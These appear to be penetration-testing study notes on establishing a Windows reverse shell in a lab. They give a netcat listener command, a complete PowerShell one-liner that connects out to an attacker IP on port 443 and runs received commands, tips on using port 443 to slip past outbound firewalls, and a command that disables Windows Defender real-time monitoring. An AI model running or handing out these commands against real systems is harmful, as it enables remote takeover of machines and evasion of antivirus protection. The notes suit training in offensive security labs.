- With a reverse shell, **the attack box will have a listener running, and the target will need to initiate the connection.**
- It is likely that an **admin will overlook outbound connections, giving us a better chance of going undetected.**
- [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) is one fantastic resource that contains a list of different commands, code, and even automated reverse shell generators

# Simple Reverse Shell in Windows
---
- We can start a Netcat listener on our attack box as the target spawns:
	- `sudo nc -lvnp 443`
- We may want to use **common ports like 443 because when we initiate the connection to our listener**, ==**we want to ensure it does not get blocked going outbound through the OS firewall and at the network level.**==
- rare to **see any security team blocking 443 outbound** since many applications and organizations rely on HTTPS
- `What applications and shell languages are hosted on the target?`
	- This is an excellent question to ask any time we are trying to establish a reverse shell.
- On the Windows target, open a command prompt and copy & paste this command:
	- `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
- **Disable AV:**
	  `Set-MpPreference -DisableRealtimeMonitoring $true`